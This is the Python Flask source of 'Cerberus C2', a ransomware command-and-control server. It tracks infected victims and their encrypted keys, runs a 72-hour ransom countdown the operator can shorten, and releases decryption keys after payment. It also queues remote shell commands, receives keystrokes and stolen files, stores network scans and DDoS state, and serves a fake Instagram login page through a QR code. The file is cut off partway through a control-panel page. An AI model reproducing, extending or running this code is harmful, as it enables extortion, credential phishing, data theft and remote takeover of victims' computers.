import os
import base64
import requests
import datetime
import io
import socket
import qrcode
import time
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, render_template, send_file
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# --- Configuration ---
C2_HOST = '0.0.0.0'
C2_PORT = 5000

# --- In-Memory "Database" ---
# Structure: {victim_id: {status: str, encrypted_key: str, decrypted_key: str, first_seen: str, timer: int}}
victims = {}

# Store pending victims waiting for target selection
# Structure: {'VICTIM_ID': {'files': ['/path/A', '/path/B'], 'command_queue': None, 'last_seen': str}}
recon_data = {}

# --- RAT Module Data Stores ---
# Poltergeist: queued commands per victim {vid: [{"cmd": ..., "type": ...}, ...]}
rat_commands = {}
# Poltergeist: command output history {vid: [{"cmd": ..., "output": ..., "time": ...}, ...]}
rat_output = {}
# Cartographer: network scan results {vid: [{"ip": ..., "ports": [...], ...}, ...]}
network_maps = {}
# Data Thief: exfiltrated files {vid: [{"name": ..., "path": ..., "data_b64": ..., "size": ...}, ...]}
exfil_store = {}
# Zombie: DDoS state {vid: {"active": bool, "target": str}}
ddos_state = {}

# --- Cryptography Setup ---
PRIVATE_KEY_FILE = "attacker_private_key.pem"
PUBLIC_KEY_FILE = "attacker_public_key.pem"

def generate_keys():
    print("Generating new RSA key pair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    with open(PRIVATE_KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    print(f"Keys saved to {PRIVATE_KEY_FILE} and {PUBLIC_KEY_FILE}")
    return private_key, public_key

if os.path.exists(PRIVATE_KEY_FILE) and os.path.exists(PUBLIC_KEY_FILE):
    with open(PRIVATE_KEY_FILE, "rb") as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
    with open(PUBLIC_KEY_FILE, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
    print("Loaded existing RSA key pair.")
else:
    private_key, public_key = generate_keys()

ATTACKER_PUBLIC_KEY = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

# --- Flask App ---
app = Flask(__name__)

@app.route('/')
def home():
    total_victims = len(victims)
    locked_count = sum(1 for v in victims.values() if v['status'] == 'UNPAID')
    waiting_count = len(recon_data)
    exfil_count = sum(len(files) for files in exfil_store.values())
    
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Cerberus C2 — Command Center</title>
        <meta http-equiv="refresh" content="10">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }
            .topbar { background: #161b22; padding: 15px 30px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }
            .topbar h1 { color: #ff4444; font-size: 22px; letter-spacing: 2px; }
            .topbar h1 span { color: #666; font-size: 14px; font-weight: normal; margin-left: 10px; }
            .topbar-links a { color: #58a6ff; text-decoration: none; margin-left: 20px; font-size: 13px; }
            .topbar-links a:hover { color: #79c0ff; }
            .stats { display: flex; gap: 15px; padding: 20px 30px; }
            .stat-card { flex: 1; background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 15px 20px; }
            .stat-card .label { color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
            .stat-card .value { font-size: 28px; font-weight: bold; margin-top: 5px; }
            .val-red { color: #ff4444; } .val-green { color: #3fb950; } .val-orange { color: #d29922; } .val-blue { color: #58a6ff; }
            .alert-banner { margin: 0 30px 15px; padding: 12px 20px; background: linear-gradient(90deg, #9e3c11, #bd4e10); border-radius: 8px; display: flex; align-items: center; justify-content: space-between; animation: pulse 2s infinite; }
            @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.8; } }
            .alert-banner .text { color: white; font-weight: 600; }
            .alert-banner a { background: white; color: #9e3c11; padding: 6px 16px; border-radius: 5px; text-decoration: none; font-weight: bold; font-size: 13px; }
            .main { padding: 10px 30px 30px; }
            .section-title { color: #c9d1d9; font-size: 16px; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid #21262d; }
            .victim-grid { display: flex; flex-direction: column; gap: 12px; }
            .victim-card { background: #161b22; border: 1px solid #21262d; border-radius: 10px; padding: 20px; display: grid; grid-template-columns: 2fr 1fr 1fr 2fr 2fr; gap: 15px; align-items: center; transition: border-color 0.2s; }
            .victim-card:hover { border-color: #388bfd; }
            .v-id { font-family: 'Courier New', monospace; color: #58a6ff; font-size: 14px; }
            .v-id a { color: #58a6ff; text-decoration: none; } .v-id a:hover { text-decoration: underline; }
            .v-ip { color: #8b949e; font-size: 13px; margin-top: 4px; }
            .badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
            .badge-locked { background: rgba(255,68,68,0.15); color: #ff4444; border: 1px solid rgba(255,68,68,0.3); }
            .badge-decrypting { background: rgba(63,185,80,0.15); color: #3fb950; border: 1px solid rgba(63,185,80,0.3); }
            .badge-other { background: rgba(210,153,34,0.15); color: #d29922; border: 1px solid rgba(210,153,34,0.3); }
            .timer-display { font-family: 'Courier New', monospace; font-size: 20px; color: #ffcc00; font-weight: bold; }
            .controls, .module-links { display: flex; flex-wrap: wrap; gap: 5px; }
            .btn { display: inline-block; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 600; color: white; transition: all 0.15s; }
            .btn-green { background: #238636; } .btn-green:hover { background: #2ea043; }
            .btn-blue { background: #1f6feb; } .btn-blue:hover { background: #388bfd; }
            .btn-red { background: #da3633; } .btn-red:hover { background: #f85149; }
            .btn-purple { background: #8957e5; } .btn-purple:hover { background: #a371f7; }
            .btn-teal { background: #1a7f6d; } .btn-teal:hover { background: #26a699; }
            .btn-orange { background: #bd4e10; } .btn-orange:hover { background: #db6d28; }
            .empty-state { text-align: center; padding: 40px; color: #484f58; }
            .footer { padding: 20px 30px; text-align: center; color: #484f58; font-size: 12px; border-top: 1px solid #21262d; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="topbar">
            <h1>☠️ CERBERUS C2 <span>Command Center</span></h1>
            <div class="topbar-links">
                <a href="/target_selection">🎯 Target Selection</a>
                <a href="/qr" target="_blank">📱 QR Code</a>
            </div>
        </div>
    """
    
    html += f"""
        <div class="stats">
            <div class="stat-card"><div class="label">Total Victims</div><div class="value val-red">{total_victims}</div></div>
            <div class="stat-card"><div class="label">Locked</div><div class="value val-orange">{locked_count}</div></div>
            <div class="stat-card"><div class="label">Awaiting Selection</div><div class="value val-blue">{waiting_count}</div></div>
            <div class="stat-card"><div class="label">Files Stolen</div><div class="value val-green">{exfil_count}</div></div>
        </div>
    """
    
    if recon_data:
        html += f"""
        <div class="alert-banner">
            <span class="text">⚠️ {len(recon_data)} victim(s) waiting for target folder selection</span>
            <a href="/target_selection">Select Targets →</a>
        </div>
        """
    
    html += '<div class="main"><h2 class="section-title">Active Victims</h2><div class="victim-grid">'
    
    if not victims:
        html += '<div class="empty-state">No victims connected yet. Deploy the payload and wait...</div>'
    
    for vid, data in victims.items():
        seconds = data.get('timer', 72*3600)
        mn, sc = divmod(seconds, 60)
        hr, mn = divmod(mn, 60)
        timer_str = f"{hr:02d}:{mn:02d}:{sc:02d}"
        
        if data['status'] == 'UNPAID':
            badge = '<span class="badge badge-locked">🔒 Locked</span>'
        elif data['status'] == 'KEY_SENT':
            badge = '<span class="badge badge-decrypting">🔓 Decrypting</span>'
        else:
            badge = f'<span class="badge badge-other">{data["status"]}</span>'
        
        exfil_file_count = len(exfil_store.get(vid, []))
        net_host_count = len(network_maps.get(vid, []))
        
        html += f"""
        <div class="victim-card">
            <div>
                <div class="v-id"><a href="/victim/{vid}">{vid}</a></div>
                <div class="v-ip">📍 {data.get('ip', 'Unknown')}</div>
            </div>
            <div>{badge}</div>
            <div class="timer-display">{timer_str}</div>
            <div class="controls">
                <a href="/mark_paid/{vid}" class="btn btn-green">🔑 Release Key</a>
                <a href="/api/timer/{vid}/add_1h" class="btn btn-blue">+1h</a>
                <a href="/api/timer/{vid}/sub_1h" class="btn btn-blue">-1h</a>
                <a href="/api/timer/{vid}/doomsday" class="btn btn-red">💀 Doom</a>
            </div>
            <div class="module-links">
                <a href="/rat_panel/{vid}" class="btn btn-purple">🎮 Remote Shell</a>
                <a href="/network_map/{vid}" class="btn btn-teal">🗺️ Network ({net_host_count})</a>
                <a href="/exfil/{vid}" class="btn btn-orange">📁 Files ({exfil_file_count})</a>
            </div>
        </div>
        """
    
    html += """
            </div>
        </div>
        <div class="footer">Cerberus C2 — Server Online | Port 5000</div>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/victim/<victim_id>')
def victim_details(victim_id):
    if victim_id not in victims:
        return "Victim not found", 404
    
    victim = victims[victim_id]
    keystrokes = victim.get('keystrokes', 'No keystrokes captured yet.')
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Victim Details - {victim_id}</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body {{ background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            h1 {{ color: #ff3333; text-shadow: 0 0 10px #ff3333; }}
            .info-box {{ background-color: #1a1a1a; padding: 20px; margin: 20px 0; border: 1px solid #333; border-radius: 8px; }}
            .keylog-box {{ background-color: #0d0d0d; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff00; font-size: 14px; white-space: pre-wrap; word-wrap: break-word; max-height: 600px; overflow-y: auto; }}
            .back-btn {{ display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 4px; margin-top: 20px; }}
            .back-btn:hover {{ background-color: #0056b3; }}
            label {{ color: #ffcc00; font-weight: bold; }}
            .refresh-notice {{ color: #888; font-size: 12px; text-align: center; margin-top: 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Victim Details: {victim_id}</h1>
            
            <div class="info-box">
                <p><label>IP Address:</label> {victim.get('ip', 'Unknown')}</p>
                <p><label>Status:</label> {victim.get('status', 'Unknown')}</p>
                <p><label>First Seen:</label> {victim.get('first_seen', 'Unknown')}</p>
                <p><label>Type:</label> {victim.get('type', 'Unknown')}</p>
            </div>
            
            <div class="info-box">
                <h2 style="color: #00ff00;">Captured Keystrokes</h2>
                <div class="keylog-box">{keystrokes if keystrokes else 'No keystrokes captured yet.'}</div>
                <p class="refresh-notice">⟳ Auto-refreshing every 5 seconds...</p>
            </div>
            
            <a href="/" class="back-btn">← Back to Dashboard</a>
        </div>
    </body>
    </html>
    """
    return html

@app.route('/instagram')
def instagram_login():
    return render_template('fake_instagram.html')

@app.route('/mobile_payload')
def mobile_payload():
    return render_template('mobile_ransomware.html')

@app.route('/qr')
def get_qr():
    # Detect LAN IP to make the QR code work for phones on the same WiFi
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = '127.0.0.1'
        
    url = f"http://{ip}:{C2_PORT}/instagram"
    
    img = qrcode.make(url)
    buf = io.BytesIO()
    img.save(buf)
    buf.seek(0)
    return send_file(buf, mimetype='image/png')

@app.route('/api/checkin', methods=['POST'])
def checkin():
    encrypted_aes_key_b64 = request.json.get('key')
    if not encrypted_aes_key_b64:
        return jsonify({"error": "Missing key"}), 400

    # Use URL-safe base64 to prevent routing issues with '/' characters
    victim_id = base64.urlsafe_b64encode(os.urandom(8)).decode('utf-8').rstrip('=')
    
    # Store timestamp for server-side timer enforcement
    start_timestamp = time.time()
    
    # Handle Mobile Simulation (fake key)
    if encrypted_aes_key_b64 == 'MOBILE_SIMULATION':
        victims[victim_id] = {
            "status": "UNPAID",
            "type": "MOBILE",
            "encrypted_key": "MOBILE_SIMULATION",
            "decrypted_key": "MOBILE_UNLOCK_CODE", # Auto-ready once paid
            "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "start_timestamp": start_timestamp,
            "timer": 72 * 3600,
            "ip": request.remote_addr
            
        }
        print(f"[+] New Mobile Victim: {victim_id}")
        return jsonify({"victim_id": victim_id})

    victims[victim_id] = {
        "status": "UNPAID",
        "type": "DESKTOP",
        "encrypted_key": encrypted_aes_key_b64,
        "decrypted_key": None,
        "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "checkin_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "start_timestamp": start_timestamp,
        "timer": 72 * 3600, # Default 72 hours
        "ip": request.remote_addr
    }
    print(f"[+] New victim check-in: {victim_id}")
    return jsonify({"victim_id": victim_id})

@app.route('/api/keylog/<victim_id>', methods=['POST'])
def receive_keylog(victim_id):
    # Handle OFFLINE victims
    if victim_id.startswith("OFFLINE-"):
        data = request.json.get('keys', '')
        if data:
            print(f"[Keylog] OFFLINE victim {victim_id}: {data[:50]}...")  # Show first 50 chars
        return jsonify({"status": "ok"})
    
    if victim_id not in victims:
        return jsonify({"status": "unknown"}), 404
        
    data = request.json.get('keys', '')
    if data:
        print(f"[Keylog] Received {len(data)} chars from {victim_id}")
        if 'keystrokes' not in victims[victim_id]:
            victims[victim_id]['keystrokes'] = ""
        timestamp = datetime.datetime.now().strftime("[%H:%M:%S] ")
        victims[victim_id]['keystrokes'] += f"\n{timestamp}{data}"
        
    return jsonify({"status": "ok"})

@app.route('/api/status/<victim_id>', methods=['GET'])
def get_status(victim_id):
    # Handle OFFLINE victims gracefully
    if victim_id.startswith("OFFLINE-"):
        print(f"[!] OFFLINE victim polling: {victim_id} (never checked in)")
        return jsonify({
            "status": "OFFLINE",
            "message": "Victim is in offline mode. Check-in failed.",
            "command": None
        })
    
    if victim_id not in victims:
        return jsonify({"status": "unknown"}), 404
    
    victim_data = victims[victim_id]
    
    # --- SERVER-SIDE TIMER ENFORCEMENT ---
    # Calculate how much time has REALLY passed since infection
    elapsed = time.time() - victim_data.get('start_timestamp', time.time())
    server_time_left = max(0, int((72 * 3600) - elapsed))
    
    # Update our server record to reflect reality
    victim_data['timer'] = server_time_left
    
    response = {
        "status": "waiting", 
        "server_timer": server_time_left
    }
    
    # Check if we need to force-update the victim's timer
    # (If victim reports significantly more time than server thinks they have)
    victim_reported_time = request.args.get('time_left', type=int)
    if victim_reported_time is not None:
        if server_time_left < (victim_reported_time - 60): # 60s buffer
            response["new_timer"] = server_time_left

    # Check for direct key delivery
    if victim_data['status'] == 'KEY_SENT' and victim_data.get('decrypted_key'):
        response["status"] = "ready"
        response["key"] = victim_data['decrypted_key']
    
    # Check for manual timer overrides (Dashboard buttons)
    if 'pending_timer_update' in victim_data:
        response["new_timer"] = victim_data['pending_timer_update']
        # Reset start_timestamp to match the new manual time
        # New Start = Now - (72h - New_Time)
        # So: Elapsed = 72h - New_Time
        new_elapsed = (72 * 3600) - victim_data['pending_timer_update']
        victim_data['start_timestamp'] = time.time() - new_elapsed
        
        del victim_data['pending_timer_update'] 
        
    return jsonify(response)

@app.route('/api/timer/<victim_id>/<action>')
def update_timer(victim_id, action):
    if victim_id not in victims:
        return "Unknown victim", 404
    
    current_timer = victims[victim_id].get('timer', 72*3600)
    
    if action == 'add_1h':
        new_time = current_timer + 3600
    elif action == 'sub_1h':
        new_time = max(0, current_timer - 3600)
    elif action == 'reset':
        new_time = 72 * 3600
    elif action == 'doomsday':
        new_time = 60 # 1 minute left!
    else:
        return "Invalid action", 400
        
    victims[victim_id]['timer'] = new_time
    # Queue this update to be sent to the victim on next heartbeat
    victims[victim_id]['pending_timer_update'] = new_time
    return redirect(url_for('home'))

# --- TARGET SELECTION FEATURE ---
@app.route('/api/recon', methods=['POST'])
def receive_recon():
    """Victim sends their folder list. We store it and wait for attacker to select."""
    data = request.json
    vid = data.get('id')
    files = data.get('files', [])
    
    recon_data[vid] = {
        'files': files,
        'command_queue': None,  # Waiting for attacker input
        'last_seen': datetime.datetime.now().strftime("%H:%M:%S")
    }
    print(f"[+] Victim {vid} is online and waiting for folder selection. {len(files)} folders found.")
    return "OK", 200

@app.route('/api/task/<vid>', methods=['GET'])
def serve_task(vid):
    """Victim polls this to see if attacker selected folders yet."""
    if vid in recon_data and recon_data[vid]['command_queue']:
        # Send the command and clear recon data
        command = recon_data[vid]['command_queue']
        del recon_data[vid]
        return jsonify(command)
    return jsonify({"action": "WAIT"})

@app.route('/target_selection')
def target_ui():
    """Attacker UI to see waiting victims and select their folders to encrypt."""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Target Selection - Cerberus C2</title>
        <!-- NO AUTO-REFRESH - Manual refresh button instead -->
        <style>
            body { background: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 20px; margin: 0; }
            h1 { color: #ff3333; text-align: center; text-shadow: 0 0 10px #ff0000; margin-bottom: 10px; }
            .subtitle { text-align: center; color: #888; margin-bottom: 20px; }
            .nav-bar { text-align: center; margin-bottom: 20px; }
            .nav-bar a { color: #00ff00; margin: 0 15px; text-decoration: none; }
            .nav-bar a:hover { text-decoration: underline; }
            .btn-refresh { background: #007bff; color: white; padding: 8px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
            .btn-refresh:hover { background: #0056b3; }
            
            .victim-card { 
                background: linear-gradient(135deg, #1a1a1a, #252525); 
                border: 2px solid #ff6600; 
                padding: 20px; 
                margin: 15px auto; 
                border-radius: 10px; 
                max-width: 900px;
                box-shadow: 0 0 20px rgba(255, 102, 0, 0.3);
            }
            .victim-header { 
                display: flex; 
                justify-content: space-between; 
                align-items: center; 
                margin-bottom: 15px;
                padding-bottom: 10px;
                border-bottom: 1px solid #444;
            }
            .victim-id { color: #ff6600; font-size: 20px; font-weight: bold; }
            .victim-status { color: #00ff00; font-size: 14px; }
            
            .folder-section { 
                background: #111; 
                border-radius: 8px; 
                padding: 15px; 
                margin: 10px 0;
                max-height: 400px;
                overflow-y: auto;
            }
            .folder-section::-webkit-scrollbar { width: 8px; }
            .folder-section::-webkit-scrollbar-track { background: #222; }
            .folder-section::-webkit-scrollbar-thumb { background: #ff6600; border-radius: 4px; }
            
            .folder-item { 
                padding: 8px 12px; 
                margin: 4px 0;
                border-radius: 5px;
                display: flex;
                align-items: center;
                cursor: pointer;
                transition: background 0.2s;
            }
            .folder-item:hover { background: #333; }
            .folder-item input { margin-right: 10px; transform: scale(1.3); }
            .folder-item label { cursor: pointer; flex: 1; }
            .folder-icon { margin-right: 8px; }
            
            .select-controls { margin: 15px 0; text-align: center; }
            .select-controls button { 
                background: #444; 
                color: white; 
                border: none; 
                padding: 8px 15px; 
                margin: 0 5px; 
                border-radius: 4px; 
                cursor: pointer;
            }
            .select-controls button:hover { background: #555; }
            
            .btn-encrypt { 
                background: linear-gradient(90deg, #dc3545, #ff0000); 
                color: white; 
                padding: 15px 50px; 
                border: none; 
                cursor: pointer; 
                font-weight: bold; 
                font-size: 18px; 
                border-radius: 8px;
                display: block;
                margin: 20px auto 0;
                transition: all 0.3s;
            }
            .btn-encrypt:hover { 
                transform: scale(1.05);
                box-shadow: 0 0 25px #ff0000; 
            }
            
            .no-victims { 
                text-align: center; 
                color: #666; 
                padding: 50px; 
                font-size: 18px;
            }
            .no-victims .icon { font-size: 50px; margin-bottom: 15px; }
            
            .tip { background: #1a3a1a; border: 1px solid #00ff00; padding: 10px 15px; border-radius: 5px; margin: 15px auto; max-width: 600px; text-align: center; color: #00ff00; }
        </style>
        <script>
            function selectAll(formId) {
                document.querySelectorAll('#' + formId + ' input[type=checkbox]').forEach(cb => cb.checked = true);
            }
            function selectNone(formId) {
                document.querySelectorAll('#' + formId + ' input[type=checkbox]').forEach(cb => cb.checked = false);
            }
        </script>
    </head>
    <body>
        <h1>🎯 Target Selection</h1>
        <p class="subtitle">Select folders to encrypt on victim machines</p>
        
        <div class="nav-bar">
            <a href="/">← Back to Dashboard</a>
            <button class="btn-refresh" onclick="location.reload()">🔄 Refresh</button>
        </div>
        
        <div class="tip">💡 TIP: This page does NOT auto-refresh. Click "Refresh" button to check for new victims.</div>
    """
    
    if not recon_data:
        html += """
        <div class="no-victims">
            <div class="icon">📭</div>
            <p>No victims waiting for target selection...</p>
            <p style="color:#444;">Run the installer on a victim machine to see them here.</p>
        </div>
        """
    
    for idx, (vid, data) in enumerate(recon_data.items()):
        form_id = f"form_{idx}"
        folder_count = len(data['files'])
        html += f"""
        <div class="victim-card">
            <div class="victim-header">
                <div class="victim-id">🖥️ VICTIM: {vid}</div>
                <div class="victim-status">● Online | Last Seen: {data['last_seen']} | {folder_count} folders found</div>
            </div>
            <form id="{form_id}" action="/send_command/{vid}" method="POST">
                <div class="select-controls">
                    <button type="button" onclick="selectAll('{form_id}')">✅ Select All</button>
                    <button type="button" onclick="selectNone('{form_id}')">❌ Deselect All</button>
                </div>
                <div class="folder-section">
        """
        for folder in sorted(data['files']):
            # Extract just the folder name for display
            folder_name = folder.split('\\')[-1] if '\\' in folder else folder.split('/')[-1]
            html += f'''
                    <div class="folder-item">
                        <input type="checkbox" name="targets" value="{folder}" id="cb_{hash(folder)}">
                        <span class="folder-icon">📁</span>
                        <label for="cb_{hash(folder)}">{folder}</label>
                    </div>
            '''
        
        html += """
                </div>
                <button type="submit" class="btn-encrypt">🔐 ENCRYPT SELECTED FOLDERS</button>
            </form>
        </div>
        """
    
    html += "</body></html>"
    return html

@app.route('/send_command/<vid>', methods=['POST'])
def send_command(vid):
    """Takes selected folders and queues the encrypt command."""
    targets = request.form.getlist('targets')
    if vid in recon_data:
        recon_data[vid]['command_queue'] = {
            "action": "ENCRYPT",
            "targets": targets
        }
        print(f"[!] ENCRYPT command queued for {vid} - {len(targets)} folders selected")
        return redirect(url_for('home'))
    return "Victim not found", 404

@app.route('/mark_paid/<victim_id>', methods=['POST', 'GET'])
def mark_as_paid(victim_id):
    victim_data = victims.get(victim_id)
    if not victim_data or victim_data['status'] != 'UNPAID':
        return redirect(url_for('home'))

    print(f"[*] Marking victim {victim_id} as paid. Decrypting key...")
    encrypted_aes_key_b64 = victim_data['encrypted_key']
    
    # Bypass for Mobile Simulation
    if victim_data.get('type') == 'MOBILE':
        victims[victim_id]['status'] = 'KEY_SENT'
        # Decrypted key is already set to dummy value
        print(f"[+] Mobile unlocking signal ready for {victim_id}")
        return redirect(url_for('home'))

    try:
        encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
        aes_key = private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')
        
        # Store the decrypted key in memory for direct delivery
        victims[victim_id]['status'] = 'KEY_SENT'
        victims[victim_id]['decrypted_key'] = aes_key_b64
        print(f"[+] Decryption key for {victim_id} is ready for delivery.")

    except Exception as e:
        print(f"[-] Error decrypting key for {victim_id}: {e}")
        victims[victim_id]['status'] = 'ERROR'

    return redirect(url_for('home'))

# --- RAT MODULE ENDPOINTS ---

# Poltergeist: RAT Command System
@app.route('/api/rat_command/<vid>', methods=['GET'])
def get_rat_command(vid):
    """Victim polls for RAT commands"""
    if vid not in rat_commands:
        rat_commands[vid] = []
    
    if rat_commands[vid]:
        cmd = rat_commands[vid].pop(0)  # FIFO queue
        return jsonify(cmd)
    return jsonify({"type": "none"})

@app.route('/api/rat_command/<vid>', methods=['POST'])
def queue_rat_command(vid):
    """Attacker queues a RAT command for victim"""
    if vid not in rat_commands:
        rat_commands[vid] = []
    
    cmd_data = request.json
    rat_commands[vid].append(cmd_data)
    print(f"[RAT] Command queued for {vid}: {cmd_data.get('type')}")
    return jsonify({"status": "queued"})

@app.route('/api/rat_output/<vid>', methods=['POST'])
def receive_rat_output(vid):
    """Victim sends command execution output"""
    if vid not in rat_output:
        rat_output[vid] = []
    
    data = request.json
    data['time'] = datetime.datetime.now().strftime("%H:%M:%S")
    rat_output[vid].append(data)
    print(f"[RAT] Output from {vid}: {data.get('cmd', 'N/A')[:50]}")
    return "OK", 200

# Cartographer: Network Mapping
@app.route('/api/network_map/<vid>', methods=['POST'])
def receive_network_map(vid):
    """Victim sends network scan results"""
    network_maps[vid] = request.json.get('hosts', [])
    print(f"[CARTOGRAPHER] {vid} mapped {len(network_maps[vid])} hosts")
    return "OK", 200

# Data Thief: File Exfiltration
@app.route('/api/exfil/<vid>', methods=['POST'])
def receive_exfil(vid):
    """Victim uploads exfiltrated files"""
    if vid not in exfil_store:
        exfil_store[vid] = []
    
    file_data = request.json
    exfil_store[vid].append(file_data)
    print(f"[DATA THIEF] {vid} exfiltrated: {file_data.get('name')}")
    return "OK", 200

@app.route('/api/exfil/<vid>/download/<int:file_id>')
def download_exfil(vid, file_id):
    """Download exfiltrated file"""
    if vid not in exfil_store or file_id >= len(exfil_store[vid]):
        return "File not found", 404
    
    file_data = exfil_store[vid][file_id]
    content = base64.b64decode(file_data['data_b64'])
    
    from io import BytesIO
    buf = BytesIO(content)
    buf.seek(0)
    return send_file(buf, download_name=file_data['name'], as_attachment=True)

# RAT Panel UI
@app.route('/rat_panel/<vid>')
def rat_panel(vid):
    """Unified RAT control panel for a victim"""
    if vid not in victims:
        return "Victim not found", 404
    
    output_history = rat_output.get(vid, [])[-20:]
    ddos_status = ddos_state.get(vid, {})
    ddos_active = ddos_status.get('active', False)
    ddos_target = ddos_status.get('target', '')
    
    # Build output HTML
    output_html = ""
    for out in reversed(output_history):
        cmd_text = out.get("cmd", "N/A")[:80]
        out_text = out.get("output", "").replace("<", "&lt;").replace(">", "&gt;")[:2000]
        output_html += f'<div class="out-cmd"><span class="time">[{out.get("time", "?")}]</span> $ {cmd_text}</div>'
        output_html += f'<pre class="out-result">{out_text}</pre>'
    
    if not output_history:
        output_html = '<div style="color: #484f58; padding: 20px; text-align: center;">No commands executed yet. Type a command above and hit Execute.</div>'
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote Shell — {vid}</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }}
            .topbar {{ background: #161b22; padding: 12px 25px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }}
            .topbar h1 {{ color: #a371f7; font-size: 18px; }}
            .topbar a {{ color: #58a6ff; text-decoration: none; margin-left: 15px; font-size: 13px; }}
            .content {{ padding: 20px 25px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }}
            .panel {{ background: #161b22; border: 1px solid #21262d; border-radius: 10px; padding: 20px; }}
            .panel h2 {{ color: #c9d1d9; font-size: 15px; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #21262d; }}
            .cmd-form {{ display: flex; gap: 8px; margin-bottom: 12px; }}
            .cmd-form input {{ flex: 1; background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 10px 14px; border-radius: 6px; font-family: 'Courier New', monospace; font-size: 14px; }}
            .cmd-form input:focus {{ outline: none; border-color: #58a6ff; }}
            .cmd-form button {{ background: #8957e5; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; }}
            .cmd-form button:hover {{ background: #a371f7; }}
            .quick-btns {{ display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 15px; }}
            .quick-btn {{ background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 5px 12px; border-radius: 5px; text-decoration: none; font-size: 12px; font-family: monospace; cursor: pointer; }}
            .quick-btn:hover {{ background: #30363d; border-color: #58a6ff; }}
            .terminal {{ background: #010409; border: 1px solid #21262d; border-radius: 8px; max-height: 400px; overflow-y: auto; padding: 12px; }}
            .out-cmd {{ color: #3fb950; font-family: 'Courier New', monospace; font-size: 13px; margin-top: 8px; }}
            .out-cmd .time {{ color: #484f58; }}
            .out-result {{ color: #8b949e; font-family: 'Courier New', monospace; font-size: 12px; margin: 4px 0 8px; padding: 0; white-space: pre-wrap; word-break: break-all; border-bottom: 1px solid #161b22; padding-bottom: 8px; }}
            .ddos-status {{ display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }}
            .dot {{ width: 10px; height: 10px; border-radius: 50%; display: inline-block; }}
            .dot-red {{ background: #f85149; box-shadow: 0 0 6px #f85149; animation: blink 1s infinite; }}
            .dot-green {{ background: #3fb950; }}
            @keyframes blink {{ 0%,100% {{ opacity:1 }} 50% {{ opacity:0.3 }} }}
            .ddos-form {{ display: flex; gap: 8px; }}
            .ddos-form input {{ flex: 1; background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; padding: 8px 12px; border-radius: 6px; }}
            .btn-attack {{ background: #da3633; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; }}
            .btn-attack:hover {{ background: #f85149; }}
            .btn-stop {{ background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; }}
            .btn-stop:hover {{ background: #2ea043; }}
            .refresh-indicator {{ color: #484f58; font-size: 11px; margin-left: 10px; }}
        </style>
    </head>
    <body>
        <div class="topbar">
